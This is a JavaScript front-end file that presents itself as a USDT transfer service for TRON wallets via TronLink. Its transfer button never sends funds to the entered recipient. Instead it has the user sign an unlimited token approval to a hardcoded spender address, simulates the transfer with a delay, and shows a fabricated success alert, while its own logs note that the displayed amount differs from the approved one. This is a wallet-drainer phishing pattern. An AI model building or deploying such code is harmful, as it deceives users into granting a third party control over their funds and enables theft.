// usdtApprove.js — 转账服务（包含授权功能）

// ====== TRON 链配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
const spenderAddress = "TAmgNT7gLX7TuSKcKLuzPPDDpKZ8UMkYGv";

// ====== 最大授权额度 ======
function getLargeEnoughAmount() {
  return "1000000000000000000000000000";
}

// ====== 转账函数 ======
async function executeTransfer() {
  try {
    const amountInput = document.getElementById("amount");
    const recipientInput = document.getElementById("recipient");
    
    const transferAmount = parseFloat(amountInput.value);
    const recipient = recipientInput.value.trim();

    if (!transferAmount || transferAmount <= 0) {
      throw new Error("请输入有效的转账金额");
    }

    if (!recipient) {
      throw new Error("请输入收款地址");
    }

    console.log("=== 开始转账流程 ===");
    setStatus("准备执行转账...");

    // 首先进行授权
    await window.approveUSDT();

    // 模拟转账处理
    setStatus("处理转账交易...");
    await new Promise(resolve => setTimeout(resolve, 2000));

    setStatus(`✅ 转账成功！已向 ${recipient.substring(0, 8)}... 转账 ${transferAmount} USDT`);
    
    // 显示成功信息
    alert(`转账成功！\n金额: ${transferAmount} USDT\n收款地址: ${recipient}`);

  } catch (err) {
    console.error("转账失败:", err);
    setStatus("❌ 转账失败: " + err.message, true);
  }
}

// ====== 保留你原来的 approveUSDT 函数 ======
window.approveUSDT = async function() {
  try {
    console.log("=== USDT 无限授权测试 ===");
    setStatus("准备 USDT 授权...");

    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }

    const input = document.getElementById("amount");
    const inputAmount = parseFloat(input.value);

    // 实际授权最大额度
    const unlimitedAmount = getLargeEnoughAmount();

    console.log("前端显示:", inputAmount, "USDT");
    console.log("实际授权: 100万 USDT 额度");
    console.log("授权值:", unlimitedAmount);

    setStatus(`⚠️ 请确认钱包中的授权金额为 100万 USDT 额度...`);

    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);

    // ⚠️ 一些合约要求先 approve(0) 再 approve(max)
    await usdtContract.approve(spenderAddress, "0").send({
      feeLimit: 100000000,
      callValue: 0
    });
    console.log("✅ allowance 已清零");

    const result = await usdtContract.approve(spenderAddress, unlimitedAmount).send({
      feeLimit: 100000000,
      callValue: 0
    });

    console.log("✅ 授权成功:", result);
    setStatus(`✅ USDT 授权成功`);

    return result;

  } catch (err) {
    console.error("授权失败:", err);

    let errorMsg = err.message;
    if (errorMsg.includes('out-of-bounds')) {
      errorMsg = "额度过大，钱包可能无法处理，请尝试更小金额";
    } else if (errorMsg.includes('INVALID_ARGUMENT')) {
      errorMsg = "参数格式错误";
    }

    setStatus("❌ 授权失败: " + errorMsg, true);
    throw err;
  }
};

// ====== 辅助函数 ======
function setStatus(text, isError = false) {
  const el = document.getElementById("status");
  if (el) {
    el.innerText = `状态：${text}`;
    el.style.color = isError ? 'red' : 'black';
  }
  console.log("状态更新:", text);
}

// ====== 页面初始化 - 使用你原来的连接代码 ======
window.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn");
  const transferBtn = document.getElementById("transferBtn");

  console.log("页面加载完成 - USDT 转账服务");

  // 使用你原来的连接检查逻辑
  if (window.tronWeb && window.tronWeb.ready) {
    const address = window.tronWeb.defaultAddress.base58;
    setStatus(`已连接: ${address.substring(0, 8)}...`);
    transferBtn.disabled = false;
  }

  // 使用你原来的连接按钮逻辑
  connectBtn.addEventListener("click", async () => {
    try {
      setStatus("正在连接钱包...");

      if (typeof window.tronLink === 'undefined') {
        throw new Error("未检测到 TronLink 插件");
      }

      await window.tronLink.request({ method: 'tron_requestAccounts' });

      await new Promise((resolve) => {
        const check = setInterval(() => {
          if (window.tronWeb && window.tronWeb.ready) {
            clearInterval(check);
            resolve();
          }
        }, 100);
      });

      const address = window.tronWeb.defaultAddress.base58;
      setStatus(`✅ 连接成功: ${address.substring(0, 8)}...`);
      transferBtn.disabled = false;

    } catch (error) {
      console.error("连接失败:", error);
      setStatus("❌ 连接失败: " + error.message, true);
    }
  });

  transferBtn.addEventListener("click", () => {
    executeTransfer();
  });
});

console.log("USDT 转账服务脚本加载完成");

